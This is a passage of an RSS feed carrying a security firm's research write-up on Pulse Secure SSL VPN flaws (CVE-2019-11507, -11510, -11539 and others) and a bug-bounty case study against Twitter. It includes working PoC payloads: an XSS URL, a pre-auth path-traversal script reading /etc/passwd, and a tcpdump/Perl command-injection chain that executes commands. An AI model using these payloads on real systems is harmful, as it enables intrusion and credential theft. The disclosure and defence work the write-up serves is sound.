        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DSID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ReplaceContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11507-cross-site-scripting&quot;&gt;CVE-2019-11507: Cross-Site Scripting&lt;/h2&gt;

&lt;p&gt;There is a CRLF Injection in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/home/cts_get_ica.cgi&lt;/code&gt;. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&amp;amp;vdi=1
&amp;amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&amp;lt;svg/onload=alert(document.domain)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11538-post-authuser-arbitrary-file-reading-via-nfs&quot;&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS&lt;/h2&gt;

&lt;p&gt;The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.&lt;/p&gt;

&lt;p&gt;If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/fb/nfs/nfb.cgi&lt;/code&gt; does not check whether the accessed file is a symlink or not!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11508-post-authuser-arbitrary-file-writing-via-nfs&quot;&gt;CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS&lt;/h2&gt;

&lt;p&gt;This one is a little bit similar to the previous one, but with a different attack vector!&lt;/p&gt;

&lt;p&gt;When the attacker uploads a ZIP file to the NFS through the web interface, the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/fb/nfs/nu.cgi&lt;/code&gt; does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11542-post-authadmin-stack-buffer-overflow&quot;&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/h2&gt;

&lt;p&gt;There is a stack-based buffer overflow in the following Perl module implementations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DSHC::ConsiderForReporting&lt;/li&gt;
  &lt;li&gt;DSHC::isSendReasonStringEnabled&lt;/li&gt;
  &lt;li&gt;DSHC::getRemedCustomInstructions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These implementations use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana-admin/auth/hc.cgi&lt;/code&gt; as our PoC.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&amp;amp;policyid=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you can observed the segment fault from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11510-pre-auth-arbitrary-file-reading&quot;&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/h2&gt;

&lt;p&gt;Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTML5 Access&lt;/code&gt;, it‚Äôs a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.&lt;/p&gt;

&lt;p&gt;In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;uri&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt;, so that we can specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the end of the query string to bypass the validation and make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt; to any file you want to download!&lt;/p&gt;

&lt;p&gt;And it‚Äôs worth to mention that in order to read arbitrary files, you must to specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.&lt;/p&gt;

&lt;p&gt;Due to the exploit is in the wild, there is no longer any concern to show the payload:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11539-post-authadmin-command-injection&quot;&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/h2&gt;

&lt;p&gt;The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didn‚Äôt find a way to exploit it, so he didn‚Äôt report to the vendor.&lt;/p&gt;

&lt;p&gt;However, we did it, and we exploit it in a very smart way :)&lt;/p&gt;

&lt;p&gt;The root cause of this vulnerability is very simple. Here is a code fragment of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana-admin/diag/diag.cgi&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;CGI::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$TCPDUMP_COMMAND&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$options&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;undef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It‚Äôs so obvious and straightforward that everyone can point out there is a command injection at the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;options&lt;/code&gt;! However, is it that easy? No!&lt;/p&gt;

&lt;p&gt;In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backtick&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;This module is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt;. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is &lt;a href=&quot;https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147&quot;&gt;the code fragments on Gist&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;From the code fragments, you can see it replaces the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; and do lots of checks in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__parsecmd&lt;/code&gt;. It also blocks numerous bad characters such as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[\&amp;amp;\*\(\)\{\}\[\]\`\;\|\?\n~&amp;lt;&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; supports and found that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-z postrotate-command&lt;/code&gt; may be useful. But the sad thing is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(&lt;/p&gt;

&lt;p&gt;While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/runtime/tmp/tt/&lt;/code&gt; to speed up script rendering. So our next attempt is to write a file into the template cache directory via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w write-file&lt;/code&gt; argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.&lt;/p&gt;

&lt;p&gt;As it seems we had reached the end of argument injection, we tried to dig deeper into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSFAFE.pm&lt;/code&gt; implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we can‚Äôt generate a valid Perl script still bothered us.&lt;/p&gt;

&lt;p&gt;We got stuck here, and it‚Äôs time to think out of the box. It‚Äôs hard to generate a valid Perl script via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;, could we just write the Perl by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;? The answer is yes. When we force the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; to read a nonexistent-file via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r read-file&lt;/code&gt;. It shows the error:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;tcpdump: [filename]: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It seems we can ‚Äú&lt;strong&gt;partially&lt;/strong&gt;‚Äù control the error message. Then we tried the filename &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print 123#&lt;/code&gt;, and the magic happens!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print 123#&apos;&lt;/span&gt;
  tcpdump: print 123#: No such file or directory
 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print 123#&apos;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | perl ‚Äì
  123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The error message becomes a valid Perl script now. Why? OK, let‚Äôs have a Perl 101 lesson now!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Perl supports the GOTO label, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump: &lt;/code&gt; becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!&lt;/p&gt;

&lt;p&gt;Finally, we use an incomplete I/O symbol &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; to fool the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt; command parser and redirect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; into the cache directory! Here is the final exploit:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r$x=&quot;ls /&quot;,system$x# 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The concatenated command looks like:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$x=&quot;ls /&quot;,system$x#&apos;&lt;/span&gt;
 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setcookie.thtml.ttc&lt;/code&gt; looks like:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ls /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#: No such file or directory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have done this, we can just fetch the corresponding page to execute our command:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp 
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!&lt;/p&gt;

&lt;h1 id=&quot;the-case-study&quot;&gt;The Case Study&lt;/h1&gt;

&lt;p&gt;After Pulse Secure patched all the bugs on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their &lt;a href=&quot;http://hackerone.com/twitter&quot;&gt;bug bounty program&lt;/a&gt; and nice to hackers. However, it‚Äôs improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P&lt;/p&gt;

&lt;p&gt;We started to hack Twitter on &lt;strong&gt;May 28, 2019&lt;/strong&gt;. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still can‚Äôt log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from &lt;a href=&quot;https://duo.com&quot;&gt;Duo&lt;/a&gt;. The &lt;a href=&quot;https://duo.com/docs/pulseconnect&quot;&gt;manual&lt;/a&gt; mentions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don‚Äôt share it with unauthorized individuals or email it to anyone under any circumstances!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329&quot;&gt;Roaming Session&lt;/a&gt; feature, which is used to enhances mobility and allows a session from multiple IP locations.&lt;/p&gt;

&lt;p&gt;Due to this ‚Äú&lt;strong&gt;convenient&lt;/strong&gt;‚Äù feature, we can just download the session database and forge our cookies to log into their system!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. It‚Äôs the restricted management interface!&lt;/p&gt;

&lt;p&gt;As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the ‚Äú&lt;strong&gt;WebVPN&lt;/strong&gt;‚Äù feature! WebVPN is a proxy which helps to connect to anywhere. So, let‚Äôs connect to itself.&lt;/p&gt;

&lt;p&gt;Yes, it‚Äôs SSRF! &lt;br /&gt;&lt;br /&gt;Here we use a small trick to bypass the SSRF protections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didn‚Äôt have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so that‚Äôs why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so it‚Äôs hard to get the manager‚Äôs plaintext password. The only thing we got, is the password hash in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sha256(md5_crypt(salt, ‚Ä¶))&lt;/code&gt; format‚Ä¶&lt;/p&gt;

&lt;p&gt;If you are experienced in cracking hashes, you will know how hard it is. So‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We launched a 72 core AWS to crack that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The manager‚Äôs password length is only ten, and the first character is &lt;strong&gt;B&lt;/strong&gt;. It‚Äôs at a very early stage of our cracking queue so that we can crack the hash in 3 hours.&lt;/p&gt;

&lt;p&gt;We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the &lt;a href=&quot;https://hackerone.com/reports/591295&quot;&gt;HackerOne link&lt;/a&gt; for more details.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;p&gt;How to mitigate such attacks? Here we give several recommendations.&lt;/p&gt;

&lt;p&gt;The first is the Client-Side Certificate. It‚Äôs also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.&lt;/p&gt;

&lt;p&gt;Also, perform your corporate asset inventory regularly and subscribe to the vendor‚Äôs security advisory. The most important of all, always keep your system updated!&lt;/p&gt;

&lt;h1 id=&quot;bonus-take-over-all-the-vpn-clients&quot;&gt;Bonus: Take over all the VPN clients&lt;/h1&gt;

&lt;p&gt;Our company, &lt;a href=&quot;https://devco.re/&quot;&gt;DEVCORE&lt;/a&gt;, provides the most professional red team service in Asia. In this bonus part, let‚Äôs talk about how to make the red team more &lt;strong&gt;RED&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.&lt;/p&gt;

&lt;p&gt;During our research, we found a new attack vector to take over all the clients. It‚Äôs the ‚Äú&lt;strong&gt;logon script&lt;/strong&gt;‚Äù feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secure‚Ä¶ and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.&lt;/p&gt;

&lt;p&gt;Due to this ‚Äú&lt;strong&gt;hacker-friendly&lt;/strong&gt;‚Äù feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/v7JUMb70ON4&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!&lt;/p&gt;

&lt;p&gt;Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/</link>
                <guid>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study</guid>
                <pubDate>Mon, 02 Sep 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pulse Secure SSL VPN Ë≥áÂÆâÈÄöÂ†±</title>
